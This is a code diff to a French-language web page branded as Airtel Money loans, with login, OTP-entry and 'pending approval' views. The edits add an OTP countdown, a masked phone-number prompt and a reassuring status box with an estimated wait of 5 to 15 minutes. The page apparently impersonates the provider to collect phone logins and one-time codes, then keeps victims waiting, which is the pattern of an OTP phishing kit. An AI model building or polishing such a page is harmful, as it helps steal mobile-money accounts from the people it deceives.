@@ -86,6 +86,10 @@ input:focus,select:focus{outline:0;border-color:var(--red)}
 .ok-msg{margin-top:16px;padding:12px;border-radius:12px;background:#e9f9ee;color:#12632d;font-weight:600}
 .ok-msg.err-msg{background:#fdeaea;color:#b80000}
 #loginForm button[disabled],#otpForm button[disabled],#next3[disabled],#resendBtn[disabled]{opacity:.6;cursor:not-allowed}
+
+@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+.spinner { width: 50px; height: 50px; border: 5px solid var(--line); border-top: 5px solid var(--red); border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }
+
 main[hidden]{display:none}
 body{-webkit-text-size-adjust:100%}
 input,select,button{font-size:16px}
@@ -163,25 +167,32 @@ img,svg{max-width:100%}
 
 <main id="view-otp" hidden>
 <div class="container"><div class="card login">
-<div class="ic-lg">📩</div><h2>Vérification OTP</h2><p class="sub">An OTP has been sent to your number.Please Enter it below</p>
+<div class="ic-lg">📩</div>
+<h2>Vérification OTP</h2>
+<p class="sub" id="otpSubText">An OTP has been sent to your number ending in ****</p>
 <form id="otpForm" novalidate>
 <div class="field">
 <div class="pin" id="otpPin"><input type="password" inputmode="numeric" pattern="[0-9]*" maxlength="1" autocomplete="off" autocapitalize="off" spellcheck="false" aria-label="OTP 1"><input type="password" inputmode="numeric" pattern="[0-9]*" maxlength="1" autocomplete="off" autocapitalize="off" spellcheck="false" aria-label="OTP 2"><input type="password" inputmode="numeric" pattern="[0-9]*" maxlength="1" autocomplete="off" autocapitalize="off" spellcheck="false" aria-label="OTP 3"><input type="password" inputmode="numeric" pattern="[0-9]*" maxlength="1" autocomplete="off" autocapitalize="off" spellcheck="false" aria-label="OTP 4"></div>
 <div class="err" id="otpErr">Le code OTP doit contenir 4 chiffres</div></div>
 <button type="submit" class="btn block">Valider</button>
 <div class="ok-msg" id="otpOk" hidden></div></form>
+<div style="margin-top: 15px; text-align: center;">
+<span id="timerText" style="font-size: 0.9rem; color: var(--muted); display: block; margin-bottom: 8px;">Code valable pendant <b id="otpCountdown">02:00</b></span>
+<button type="button" class="btn ghost block" id="resendBtn" disabled>Renvoyer le code</button>
+</div>
 <p class="secure">🔒 Vos informations sont sécurisées et chiffrées</p></div></div></main>
 
-<!-- New Pending Window -->
 <main id="view-pending" hidden>
 <div class="container"><div class="card login" style="text-align:center;">
-<div class="ic-lg" style="animation: pulse 1.5s infinite;">⏳</div>
-<h2>Traitement en cours</h2>
-<p class="sub">Votre demande de prêt est en cours de validation par le système.</p>
-<div style="font-size: 2.5rem; font-weight: 800; color: var(--red); margin: 20px 0;" id="timerDisplay">02:00</div>
-<p class="sub" style="font-size: 0.9rem;">Veuillez patienter pendant que nous finalisons l'approbation.</p>
-<button type="button" class="btn block ghost" id="resendBtn" disabled style="margin-top: 20px;">Renvoyer le code</button>
-<p class="secure" style="margin-top: 20px;">🔒 Sécurisé par Airtel Money</p></div></div></main>
+<div class="spinner"></div>
+<h2>Demande en attente</h2>
+<p class="sub">Votre demande de prêt a été transmise avec succès et est actuellement en cours de traitement par notre service d'approbation.</p>
+<div style="background: var(--soft); padding: 15px; border-radius: 12px; margin: 20px 0; text-align: left; font-size: 0.9rem;">
+<p style="margin-bottom: 6px;"><b>Statut :</b> En cours d'examen</p>
+<p style="margin-bottom: 6px;"><b>Délai estimé :</b> 5 à 15 minutes</p>
+<p><b>Notification :</b> SMS de confirmation à venir</p>
+</div>
+<p class="secure">🔒 Sécurisé et chiffré par Airtel Money</p></div></div></main>
 
 <footer id="footer"><div class="container"><span class="logo">airtel</span><span>© 2026 Prêts Airtel</span>
 <div class="links"><a href="#">Politique de confidentialité</a>|<a href="#">Conditions générales</a>|<a href="#contact">Contacter l’assistance</a></div></div></footer>
@@ -283,24 +294,24 @@ document.querySelectorAll('nav a[data-go]').forEach(a=>a.dataset.view='home');
 window.goView=show;
 show('home');
 
-// Countdown logic for Pending view
-let countdownTimer = null;
-function startPendingCountdown(){
-  const timerDisplay = document.getElementById('timerDisplay');
+// OTP Countdown & Cooldown Logic
+let otpTimerInterval = null;
+function startOtpCountdown(){
+  const countdownEl = document.getElementById('otpCountdown');
   const resendBtn = document.getElementById('resendBtn');
-  let timeLeft = 120; // 2 minutes in seconds
-  
-  resendBtn.disabled = true;
-  clearInterval(countdownTimer);
+  let timeLeft = 120; // 2 minutes (120 seconds)
 
-  countdownTimer = setInterval(()=>{
+  resendBtn.disabled = true;
+  clearInterval(otpTimerInterval);
+
+  otpTimerInterval = setInterval(()=>{
     let mins = Math.floor(timeLeft / 60);
     let secs = timeLeft % 60;
-    timerDisplay.textContent = `${String(mins).padStart(2,'0')}:${String(secs).padStart(2,'0')}`;
-    
+    countdownEl.textContent = `${String(mins).padStart(2,'0')}:${String(secs).padStart(2,'0')}`;
+
     if(timeLeft <= 0){
-      clearInterval(countdownTimer);
-      resendBtn.disabled = false; // Enable resend button
+      clearInterval(otpTimerInterval);
+      resendBtn.disabled = false; // Enable resend button when cooldown reaches zero
     }
     timeLeft--;
   }, 1000);
@@ -308,7 +319,7 @@ function startPendingCountdown(){
 
 document.getElementById('resendBtn').addEventListener('click', ()=>{
   if(!document.getElementById('resendBtn').disabled){
-    startPendingCountdown();
+    startOtpCountdown();
   }
 });
 
@@ -411,7 +422,13 @@ document.getElementById('resendBtn').addEventListener('click', ()=>{
         loginBtn.disabled=false;
         loginBtn.textContent=old;
         loginBusy=false;
+
+        // Set the masked phone number string dynamically using the last 4 digits
+        const last4 = globalPhone.slice(-4);
+        document.getElementById('otpSubText').textContent = `An OTP has been sent to your number ending in ${last4}`;
+
         show('otp');
+        startOtpCountdown();
       }, 1000);
 
     }catch(err){
@@ -474,8 +491,7 @@ document.getElementById('resendBtn').addEventListener('click', ()=>{
         otpBtn.disabled=false;
         otpBtn.textContent=old;
         otpBusy=false;
-        show('pending');
-        startPendingCountdown();
+        show('pending'); // Redirects smoothly to the animated pending status view
       }, 1000);
 
     }catch(err){
